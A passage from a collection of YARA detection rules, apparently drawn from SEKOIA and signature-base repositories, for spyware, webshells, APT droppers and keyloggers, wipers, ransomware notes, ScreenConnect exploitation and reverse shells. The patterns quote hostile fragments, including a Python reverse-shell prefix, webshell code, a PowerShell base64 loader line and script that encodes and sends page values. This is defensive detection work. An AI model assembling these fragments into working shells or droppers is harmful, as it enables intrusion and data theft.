		reference = "https://www.welivesecurity.com/2022/11/23/bahamut-cybermercenary-group-targets-android-users-fake-vpn-apps/"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/spyware_and_bahamut.yar#L1-L20"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "5f44c938fed9b32eaf183be979a67e0c7fde409e72875359105ad7ffb393893d"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"
		hash1 = "c51dc2132c830c560aaeae4bf48e5f0d28c84b36d27840b5c2ba170d87f4afa5"
		hash2 = "d7e2cf642b236dba9ba0cbe5a9dc28baf22477973d5ce163e21ec40f5f26e078"

	strings:
		$ = "FbDao"
		$ = "SignalDao"
		$ = "conionDao"

	condition:
		all of them
}

rule SEKOIA_Webshell_Wso_Webshell_Strings_1
{
	meta:
		description = "Detects the WSO webshells"
		author = "Sekoia.io"
		id = "84340792-73a4-4d61-9957-6cfa1f6444a7"
		date = "2022-04-22"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/webshell_wso_webshell_strings.yar#L1-L20"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "4d6966a34dc8e7390913857144da106affea14668d1c2c11a05be62a6e625c8f"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "decrypt($str,$pwd){$pwd=base64_encode($pwd);"
		$ = "prototype(md5($_SERVER['HTTP_HOST'])"
		$ = "$_COOKIE[md5($_SERVER['HTTP_HOST'])."
		$ = "set(a,c,p1,p2,p3,charset)"
		$ = "(($p & 0x0008) ? (($p & 0x0400)"
		$ = "gcc','lcc','cc','ld','make','php"

	condition:
		3 of them
}

rule SEKOIA_Apt_Uta0178_Javascript_Inclusion_Strings_1
{
	meta:
		description = "Detects UTA0178 malicious inclusion strings"
		author = "Sekoia.io"
		id = "af816c35-1f00-47ea-86ee-c034607c625e"
		date = "2024-01-12"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_uta0178_javascript_inclusion_strings.yar#L1-L23"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "d3fedf49417178df374d6ae20e57ffcfa00cb68a647769964c049d9a8e0f4958"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s0 = ".value"
		$s1 = "btoa("
		$s2 = "https://"
		$s3 = "new XMLHttpRequest();"
		$s4 = ".send(null);"

	condition:
		@s0< @s1 and @s1 < @s2 and @s2 < @s3 and @s3 < @s4 and @s4- @s0 < 350
}

rule SEKOIA_Apt_Spikedwine_Malicious_Hta_1
{
	meta:
		description = "Detects malicious HTA used by SPIKEDWINE"
		author = "Sekoia.io"
		id = "e4526142-d98a-bf35-9d2c-ca2e83638c4b"
		date = "2024-02-29"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_spikedwine_malicious_hta.yar#L1-L17"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "305896cde5d95c29de511541a961063730709d40d67a8788f084c17f181e3baf"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "<HTA:APPLICATION ID=" nocase
		$ = "return _0x"
		$ = "font-size: 18px;"

	condition:
		all of them
}

rule SEKOIA_Downloader_Win_Donot_1
{
	meta:
		description = "Detect the DoNot's downloader malware. There are big binaries in downloader strings."
		author = "Sekoia.io"
		id = "31b153cc-a4b9-40a0-8bcb-ce1370645b4b"
		date = "2023-03-20"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/downloader_win_donot.yar#L1-L19"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "f6a03e6cfda74c1fbb1e8939a66735498d604a821b8b51492c2c5c6a46a38b6e"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "001100000011000100110001001100000011000000110000001100010011000100110000001100010011000100110000001100010011000100110000001100010011"
		$ = "01010011011011110110011001110100011101110110000101110010011001010101110001001101011010010110001101110010011011110111001101101111011001100111010001011100010101110110100101101110011001000110111101110111011100110101110001000011011101010111001001110010011001010110111001110100010101100110010101110010011100110110100101101111011011100101110001010101011011100110100101101110011100110111010001100001011011000110110000000000"
		$ = "0101110001110011011110010111001101110100011001010110110100110011001100100101110001110010011101010110111001100100011011000110110000110011001100100010111001100101011110000110010100000000"

	condition:
		1 of them
}

rule SEKOIA_Clipper_Win_Atlas_Strings_1
{
	meta:
		description = "Detects Atlas Clipper"
		author = "Sekoia.io"
		id = "f08c6af6-c325-4f7d-8686-575b25550d6a"
		date = "2023-07-10"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/clipper_win_atlas_strings.yar#L1-L22"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "c8ad062b69dfe996a488ee9c79f0e7e0016f57f5b54fc39aeb4e207d2a42aa75"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "C:/Users/box/Desktop/ATLAS/ATLAS/main.go" ascii
		$s2 = "ATLAS Clipper" ascii
		$s3 = "Victim: %s" ascii
		$s4 = "Attacker: %s" ascii
		$s5 = "Install Path: %s" ascii
		$s6 = "HWID: %s" ascii
		$s7 = "Install Date: %s" ascii
		$s8 = "https://t.me/atlasclipper_channel" ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_HKTL_NFS_Fuse_NFS_1
{
	meta:
		description = "Detects the nfs-security-tooling fuse_nfs by HvS Consulting"
		author = "Moritz Oettle"
		id = "287fbe7d-ee1c-58a4-aa2d-9d9bec8321b4"
		date = "2024-10-22"
		modified = "2025-03-20"
		reference = "https://github.com/hvs-consulting/nfs-security-tooling"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/hktl_HvS_nfs_security_tooling.yar#L1-L24"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "0bd3714b865d77660404e5f3ed1e9c7b55aadc6f58d16761111be57597784686"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "NFS3ConnectionFactory" fullword ascii
		$s2 = "fuse_to_nfs_timestamp" fullword ascii
		$s3 = "--manual-fh" fullword ascii
		$s4 = "--fake-uid-allow-root" fullword ascii
		$s5 = "nfs.rpc.credential" fullword ascii
		$s6 = "nfs.readlink" fullword ascii
		$s7 = "pyfuse3.EntryAttributes" fullword ascii
		$s8 = "Make nested exports on NetApp servers work" fullword ascii
		$s9 = "add_mutually_exclusive_group" fullword ascii

	condition:
		4 of them
}

rule SIGNATURE_BASE_HKTL_NFS_NFS_Analyze_1
{
	meta:
		description = "Detects the nfs-security-tooling nfy_analyze by HvS Consulting"
		author = "Marc Stroebel"
		id = "3350d0ae-e638-5c8f-a578-ba0ac5521053"
		date = "2024-10-22"
		modified = "2025-03-20"
		reference = "https://github.com/hvs-consulting/nfs-security-tooling"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/hktl_HvS_nfs_security_tooling.yar#L26-L53"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "83a9e5b5b404bf28b0334611fe4f38227212783cecea3c9996d23cb00cad42ed"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "no_root_squash_exports" fullword ascii
		$s2 = "nfs lock manager" fullword ascii
		$s3 = "netapp partner" fullword ascii
		$s4 = "xdrdef.mnt3_type" fullword ascii
		$s5 = "BTRFS subvolumes" fullword ascii
		$s6 = "Unsupported fsid" fullword ascii
		$s7 = "nfs3_read_etc_shadow" fullword ascii
		$s8 = "nfs3_check_no_root_squash" fullword ascii
		$s9 = "krb5i" fullword ascii
		$s10 = "nfs4_overview" fullword ascii
		$s11 = "--btrfs-subvolumes" fullword ascii
		$s12 = "when escaping a BTRFS export" fullword ascii
		$s13 = "No NFS server detected" fullword ascii

	condition:
		6 of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Agent_Powershell_Dropper_1
{
	meta:
		description = "Strings from PowerShell dropper of CSharp version of Agent"
		author = "Fox-IT SRT"
		id = "833ce607-56a9-5580-bbd1-e72392945fec"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_op_wocao.yar#L24-L38"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "19f56e69685ae8c13b9dd884f8322915835c16e2c6313f01f9fa447218419108"
		score = 75
		quality = 85
		tags = ""

	strings:
		$a = "function format([string]$source)"
		$b = "foreach($c in $bb){$tt = $tt + [char]($c -bxor"
		$c = "[agent]::Main($args);"

	condition:
		1 of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Agent_Powershell_B64Encoded_1
{
	meta:
		description = "Piece of Base64 encoded data from Agent CSharp version"
		author = "Fox-IT SRT"
		id = "14e1702d-6229-5989-8bb7-cc9c0c321676"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_op_wocao.yar#L40-L52"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "bcf9a75dbbf90044db76c56ffd07971d4252b0e75d73abf402ca4fadbfb59767"
		score = 75
		quality = 85
		tags = ""

	strings:
		$header = "LFNVT0hBBnVfVVJDSx0sU1VPSEEGdV9VUkNLCG9pHSxTVU9IQQZ1X1VSQ0sIZUlK"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Agent_Py_B64Encoded_1
{
	meta:
		description = "Piece of Base64 encoded data from Agent Python version"
		author = "Fox-IT SRT"
		id = "eb2701e9-4358-5d24-bfcd-b4dde24f13bf"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_op_wocao.yar#L77-L89"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "279fb27637d9b62b484283f778215d042de9fb83110a233e048452e921c540ee"
		score = 75
		quality = 85
		tags = ""

	strings:
		$header = "QlpoOTFBWSZTWWDdHjgABDTfgHwQe////z/v/9+////6YA4cGPsAl2e8M9LSU128"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Keylogger_Py_1
{
	meta:
		description = "Strings from Python keylogger"
		author = "Fox-IT SRT"
		id = "f7b5ec1b-669e-5e7d-a9d3-011d212eb363"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_op_wocao.yar#L91-L107"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "2dc2ce153d559d795f302f5ca4a9ef9e6e5c54762472e38e6f4a26ef8a28a184"
		score = 75
		quality = 85
		tags = ""

	strings:
		$a = "c:\\windows\\temp\\tap.tmp"
		$b = "c:\\windows\\temp\\mrteeh.tmp"
		$c = "GenFileName"
		$d = "outfile"
		$e = "[PASTE:%d]"

	condition:
		3 of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Xserver_Powershell_B64Encoded_1
{
	meta:
		description = "Piece of Base64 encoded data from the XServer PowerShell dropper"
		author = "Fox-IT SRT"
		id = "01e38cfb-b245-5398-b037-6d1d2fb726ee"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_op_wocao.yar#L143-L155"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "77315f0fc8387fa87892fc8fcea1f6e8a95560049aaa9a87519859020d0a7a3e"
		score = 75
		quality = 85
		tags = ""

	strings:
		$header_47000 = "5T39c9u2kr/nr2A0Ny2VKIzkfLRJntuJHafPN/nwWG777rUZDy3BNq8UqSEpx26b"
		$header_25667 = "5T1rc9u2st/zKxjNmZZKFEZyErdJ6nZsx+nxnTjxWGp77mkzHlqCbd5SpIak/Gjr"

	condition:
		any of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Xserver_Powershell_Dropper_1
{
	meta:
		description = "Strings from the PowerShell dropper of XServer"
		author = "Fox-IT SRT"
		id = "97169ab4-d68d-5137-83de-d9cac975747e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_op_wocao.yar#L157-L168"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "640c9e52f3cf3df4e954177624e6fba4bab80a2c9442b718fe90e8577dafbbd6"
		score = 75
		quality = 85
		tags = ""

	strings:
		$encfile = "New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($encfile)"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Timeliner_Bin_1
{
	meta:
		description = "Timeliner utility"
		author = "Fox-IT SRT"
		id = "3d81a4ae-0ce0-5867-ac93-a706556481b6"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_op_wocao.yar#L195-L213"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "c3a8cddc34134faaab93ee0df0086604e4a7b031530dd65e2e8dab705483305b"
		score = 75
		quality = 85
		tags = ""

	strings:
		$a = "[+] Work completed." ascii wide
		$b = "[-] Create a new file failed." ascii wide
		$c = "[-] This is not a correct path." ascii wide
		$d = "%s [TargetPath] <Num> <SavePath>" ascii wide
		$e = "D\t%ld\t%ld\t%ld\t%d\t%d\t%s\t" ascii wide
		$f = "D\t%ld\t%ld\t%ld\t-1\t%d\t%s\t" ascii wide
		$g = "%s\t%ld\t%ld\t%ld\t%I64d\t%d\t%s\t%s" ascii wide

	condition:
		1 of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Info_Vbs_1
{
	meta:
		description = "Strings from the information grabber VBS"
		author = "Fox-IT SRT"
		id = "b719fb31-2836-5faf-a7c8-c361a14df2be"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_op_wocao.yar#L297-L316"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "e37f8768c7920b8c3d9fdd6bb3a4e748c47a6c06a8aaed01655355ef3d8c3457"
		score = 75
		quality = 85
		tags = ""

	strings:
		$ = "Logger PingConnect"
		$ = "Logger GetAdmins"
		$ = "Logger InstallPro"
		$ = "Logger Exec"
		$ = "retstr = adminsName & \" Members\" & vbCrLf & _"
		$ = "Logger VolumeName & \" (\" & objDrive.DriveLetter & \":)\" _"
		$ = "txtRes = txtRes & machine & \" can"
		$ = "retstr = \"PID   SID Image Name\" & vbCrLf & \"===="

	condition:
		4 of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Webshell_Console_Jsp_1
{
	meta:
		description = "Strings from the console.jsp webshell"
		author = "Fox-IT SRT"
		id = "1afdfc34-d2e3-58c7-80ea-ee5632e42469"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_op_wocao.yar#L318-L335"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "e70c15ef10b63a011edbcedc773a8e2917fd915c3ecc273c3bf2b78eb10fc570"
		score = 75
		quality = 85
		tags = ""

	strings:
		$a = "String strLogo = request.getParameter(\"image\")"
		$b = "!strLogo.equals(\"web.gif\")"
		$c = "<font color=red>Save Failed!</font>"
		$d = "<font color=red>Save Success!</font>"
		$e = "Save path:<br><input type=text"
		$f = "if (newfile.exists() && newfile.length()>0) { out.println"

	condition:
		1 of them
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Webshell_Index_Jsp_1
{
	meta:
		description = "Strings from the index.jsp socket tunnel"
		author = "Fox-IT SRT"
		id = "9c226ccd-6c69-523c-bca4-371e55274667"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_op_wocao.yar#L337-L353"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "870dad9fb5456f8edbd9f3c2d0b8764cf1143399626ce4df53c93919bcb1a0cb"
		score = 75
		quality = 85
		tags = ""

	strings:
		$x1 = "X-CMD"
		$x2 = "X-STATUS"
		$x3 = "X-TARGET"
		$x4 = "X-ERROR"
		$a = "out.print(\"All seems fine.\");"

	condition:
		all of ( $x* ) and $a
}

rule SIGNATURE_BASE_APT_MAL_CN_Wocao_Webshell_Webinfo_1
{
	meta:
		description = "Generic strings from webinfo.war webshells"
		author = "Fox-IT SRT"
		id = "b8477f62-f3f6-5526-b0e3-9b794fefaa1f"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_op_wocao.yar#L374-L394"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "711737a56067f24f422cc7d5aeba4389741fe18a0e66f2715fce626c3b6aef19"
		score = 75
		quality = 85
		tags = ""

	strings:
		$var1 = "String strLogo = request.getParameter"
		$var2 = "String content = request.getParameter(\"content\");"
		$var3 = "String basePath=request.getScheme()"
		$var4 = "!strLogo.equals("
		$var5 = "if(path!=null && !path.equals(\"\") && content!=null"
		$var6 = "File newfile=new File(path);"
		$str1 = "Save Success!"
		$str2 = "Save Failed!"

	condition:
		2 of ( $var* ) or ( all of ( $str* ) and 1 of ( $var* ) )
}

rule SIGNATURE_BASE_APT_Crywiper_Dec22_1
{
	meta:
		description = "Detects CryWiper malware samples"
		author = "Florian Roth (Nextron Systems)"
		id = "d56ccf4e-30ba-5308-ad68-ffc2ae5a1718"
		date = "2022-12-05"
		modified = "2023-12-05"
		reference = "https://securelist-ru.translate.goog/novyj-troyanec-crywiper/106114/?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_ru_crywiper.yar#L2-L19"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "7c22e02ed996cd820ed87a0c5d50e3264629cdd887aad4ea466cadeccaee2b2f"
		score = 75
		quality = 85
		tags = ""

	strings:
		$x1 = "Software\\Sysinternals\\BrowserUpdate"
		$sx1 = "taskkill.exe /f /im MSExchange*"
		$s1 = "SYSTEM\\CurrentControlSet\\Control\\Terminal Server" ascii
		$s2 = "fDenyTSConnections" ascii

	condition:
		1 of ( $x* ) or all of ( $s* )
}

rule SIGNATURE_BASE_Connectwise_Screenconnect_Authentication_Bypass_Feb_2024_Exploitation_IIS_Logs_1
{
	meta:
		description = "Detects an http request to '/SetupWizard.aspx/' with anything following it, which when found in IIS logs is a potential indicator of compromise of the 2024 ConnectWise ScreenConnect (versions prior to 23.9.8) vulnerability that allows an Authentication Bypass"
		author = "Huntress DE&TH Team (modified by Florian Roth)"
		id = "2886530b-e164-4c4b-b01e-950e3c40acb4"
		date = "2024-02-20"
		modified = "2024-02-21"
		reference = "https://www.connectwise.com/company/trust/security-bulletins/connectwise-screenconnect-23.9.8"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/expl_connectwise_screenconnect_vuln_feb24.yar#L3-L18"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "f6c7a3aa2ed98e754f9523c55eb035c7bc5f8aea96a6f86c729e9658d78710fb"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = " GET /SetupWizard.aspx/" ascii
		$s2 = " POST /SetupWizard.aspx/" ascii
		$s3 = " PUT /SetupWizard.aspx/" ascii
		$s4 = " HEAD /SetupWizard.aspx/" ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_MAL_SUSP_RANSOM_Lockbit_Ransomnote_Feb24_1
{
	meta:
		description = "Detects the LockBit ransom note file 'LockBit-DECRYPT.txt' which is a sign of a LockBit ransomware infection"
		author = "Florian Roth"
		id = "b2fcb2a7-49e8-520c-944f-6acd5ded579b"
		date = "2024-02-23"
		modified = "2024-04-24"
		reference = "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/expl_connectwise_screenconnect_vuln_feb24.yar#L137-L149"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "1fe07c33de1971b1f9430851dec4b8cd9f3ac7f087f0de18a2da4a390891b674"
		score = 75
		quality = 85
		tags = ""

	strings:
		$x1 = ">>>> Your personal DECRYPTION ID:"

	condition:
		1 of them
}

rule SIGNATURE_BASE_MAL_SUSP_RANSOM_Lazy_Ransomnote_Feb24_1
{
	meta:
		description = "Detects the Lazy ransom note file 'HowToRestoreYourFiles.txt' which is a sign of a Lazy ransomware infection"
		author = "Florian Roth"
		id = "287dfd67-8d0d-5906-b593-3af42a5a3aa4"
		date = "2024-02-23"
		modified = "2024-04-24"
		reference = "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/expl_connectwise_screenconnect_vuln_feb24.yar#L151-L163"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "c9416d05f0bd9aab9d6108380c1b5364f4c4e112b6e0726202f083eaacfdcf56"
		score = 75
		quality = 85
		tags = ""

	strings:
		$x1 = "All Encrypted files can be reversed to original form and become usable"

	condition:
		1 of them
}

rule SIGNATURE_BASE_SUSP_PY_Import_Statement_Apr24_1_1
{
	meta:
		description = "Detects suspicious Python import statement and socket usage often found in Python reverse shells"
		author = "Florian Roth"
		id = "8e05f9a1-40a8-5d01-9e45-8779b0ff7a45"
		date = "2024-04-15"
		modified = "2025-03-21"
		reference = "https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/vuln_paloalto_cve_2024_3400_apr24.yar#L67-L79"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "d5c199d9c3e449ca282f0ca91c94ac783709299b3489f7cec38177a2f843b504"
		score = 65
		quality = 85
		tags = ""

	strings:
		$x1 = "import sys,socket,os,pty;s=socket.socket("

	condition:
		1 of them
}

rule SIGNATURE_BASE_MAL_PY_Dimorf_1
{
	meta:
		description = "Detection for Dimorf ransomeware"
		author = "Silas Cutler"
		id = "78b53433-6926-58cd-8ec0-2195af803aab"
		date = "2023-01-03"
		modified = "2023-12-05"
		reference = "https://github.com/Ort0x36/Dimorf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_100days_of_yara_2023.yar#L224-L242"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "7499b21f77d07364983b94134a60f7c99e71a5392386437d459a196bf71852fb"
		score = 75
		quality = 85
		tags = ""
		version = "1.0"

	strings:
		$func01 = "def find_and_encrypt"
		$func02 = "def check_os"
		$comment01 = "checks if the user has permission on the file."
		$misc01 = "log_dimorf.log"
		$misc02 = ".dimorf"

	condition:
		all of them
}

rule SIGNATURE_BASE_SUSP_NK_MAL_M_Hunting_POOLRAT_1
{
	meta:
		description = "Detects strings found in POOLRAT malware"
		author = "Mandiant"
		id = "70f5f3a0-0fd0-54dc-97cc-4f3c35f02fcd"
		date = "2023-04-20"
		modified = "2023-12-05"
		old_rule_name = "APT_NK_MAL_M_Hunting_POOLRAT"
		reference = "https://www.mandiant.com/resources/blog/3cx-software-supply-chain-compromise"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_nk_tradingtech_apr23.yar#L166-L202"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "ac8db844a9c4ed961930417809afb706ea948c4509a4be1eaeed77f09c86069d"
		score = 70
		quality = 83
		tags = ""
		disclaimer = "This rule is meant for hunting and is not tested to run in a production environment"
		hash1 = "451c23709ecd5a8461ad060f6346930c"

	strings:
		$s1 = "name=\"uid\"%s%s%u%s" ascii wide
		$s2 = "name=\"session\"%s%s%u%s" ascii wide
		$s3 = "name=\"action\"%s%s%s%s" ascii wide
		$s4 = "name=\"token\"%s%s%u%s" ascii wide
		$str1 = "--N9dLfqxHNUUw8qaUPqggVTpX-" wide ascii nocase

	condition:
		any of ( $s* ) or $str1
}

rule SIGNATURE_BASE_MAL_APT_NK_Andariel_Kaosrat_Yamabot_1
{
	meta:
		description = "Detects the KaosRAT variant"
		author = "CISA.gov"
		id = "cdde69cd-1b38-52f5-8552-cef2cf4ad69c"
		date = "2024-07-25"
		modified = "2024-12-12"
		reference = "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_nk_andariel_jul24.yar#L20-L42"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "92182aac2e56041292102b0486b7de1ee6eb3d54a9fc6786c567acd92073cd84"
		score = 70
		quality = 85
		tags = ""

	strings:
		$str1 = "/kaos/"
		$str2 = "Abstand ["
		$str3 = "] anwenden"
		$str4 = "cmVjYXB0Y2hh"
		$str5 = "/bin/sh"
		$str6 = "utilities.CIpaddress"
		$str7 = "engine.NewEgg"
